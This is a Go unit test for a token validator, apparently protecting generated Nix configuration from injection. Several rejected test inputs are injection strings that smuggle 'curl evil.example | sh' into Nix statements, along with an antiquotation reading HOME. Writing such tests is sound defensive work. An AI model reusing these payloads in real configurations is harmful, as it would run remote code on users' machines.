package ecosystem_test

import (
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/pkg/ecosystem"
)

func TestIsValidToken(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		in   string
		want bool
	}{
		{"service version", "16", true},
		{"dotted version", "16.2", true},
		{"package manager", "pnpm", true},
		{"service name", "mariadb", true},
		{"dash and underscore", "my-db_1", true},
		{"at max length", strings.Repeat("a", 64), true},
		{"over max length", strings.Repeat("a", 65), false},
		{"1024 bytes", strings.Repeat("a", 1024), false},
		{"empty", "", false},
		{"leading dot", ".x", false},
		{"leading dash", "-x", false},
		{"nix statement break", "16; }; processes.pwn.exec = ''curl evil.example | sh''; services.zz = { enable = false; package = pkgs.hello", false},
		{"list break", "hello ]; enterShell = \"curl evil | sh\"; x = [ pkgs.hello", false},
		{"assignment", "X = 1; y", false},
		{"antiquotation", "a${builtins.getEnv \"HOME\"}", false},
		{"newline", "a\nb", false},
		{"comment", "a#comment", false},
		{"url", "https://evil.example/x", false},
		{"parenthesised import", "(import x)", false},
		{"mirrorOf separator", "a,b", false},
		{"mirrorOf negation", "!central", false},
		{"mirrorOf wildcard", "*", false},
		{"space", "has space", false},
		{"tab", "a\tb", false},
		{"zero width space", "ab\u200b", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := ecosystem.IsValidToken(tt.in); got != tt.want {
				t.Errorf("IsValidToken(%q) = %v, want %v", tt.in, got, tt.want)
			}
		})
	}
}

func TestIsValidToken_RejectsStructuralChars(t *testing.T) {
	t.Parallel()
	for _, c := range []string{";", "{", "}", "[", "]", "(", ")", "\"", "'", "$", "/", ":", "#", "\t", "\n", "\\", "`", "@", ",", "!", "*", " "} {
		if v := "a" + c + "b"; ecosystem.IsValidToken(v) {
			t.Errorf("IsValidToken(%q) = true, want false", v)
		}
	}
}
